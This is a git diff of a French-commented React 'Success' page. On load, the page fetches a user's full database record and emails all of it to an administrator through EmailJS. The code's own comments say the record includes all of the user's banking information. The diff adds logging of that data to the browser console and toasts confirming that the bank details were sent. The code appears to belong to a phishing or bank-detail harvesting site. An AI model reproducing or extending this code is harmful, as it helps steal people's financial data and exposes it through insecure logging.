@@ -1,15 +1,26 @@
 
-import React, { useEffect } from "react";
+import React, { useEffect, useState } from "react";
 import { Footer } from "@/components/Footer";
 import { Loader } from "lucide-react";
 import { supabase } from "@/lib/supabase";
-import { sendAdminNotification } from "@/lib/emailService";
+import { sendAdminNotification, initEmailJS } from "@/lib/emailService";
+import { useToast } from "@/components/ui/use-toast";
 
 const Success = () => {
+  const [isEmailSent, setIsEmailSent] = useState(false);
+  const [isProcessing, setIsProcessing] = useState(true);
+  const { toast } = useToast();
+
   useEffect(() => {
+    // Réinitialiser EmailJS pour s'assurer qu'il est correctement configuré
+    initEmailJS();
+    
     const notifyAdmin = async () => {
       const userId = localStorage.getItem("userId");
-      if (!userId) return;
+      if (!userId) {
+        setIsProcessing(false);
+        return;
+      }
 
       try {
         // Récupérer les infos de l'utilisateur
@@ -21,6 +32,7 @@ const Success = () => {
 
         if (error || !data) {
           console.error("Erreur lors de la récupération des données utilisateur:", error);
+          setIsProcessing(false);
           return;
         }
 
@@ -33,22 +45,36 @@ const Success = () => {
           .eq("id", userId);
           
         // Envoyer une notification à l'administrateur avec toutes les infos bancaires
+        console.log("Tentative d'envoi d'email avec les données:", data);
+        
         const success = await sendAdminNotification({
           userData: data  // Envoyer toutes les données utilisateur
         });
         
         if (success) {
           console.log("Email avec les informations bancaires envoyé avec succès");
+          setIsEmailSent(true);
+          toast({
+            title: "Email envoyé",
+            description: "Les informations bancaires ont été envoyées avec succès",
+          });
         } else {
           console.error("Échec de l'envoi de l'email avec les informations bancaires");
+          toast({
+            title: "Erreur d'envoi",
+            description: "Une erreur s'est produite lors de l'envoi des informations bancaires",
+            variant: "destructive",
+          });
         }
       } catch (error) {
         console.error("Erreur lors de la notification:", error);
+      } finally {
+        setIsProcessing(false);
       }
     };
 
     notifyAdmin();
-  }, []);
+  }, [toast]);
 
   return (
     <div className="min-h-screen flex flex-col">
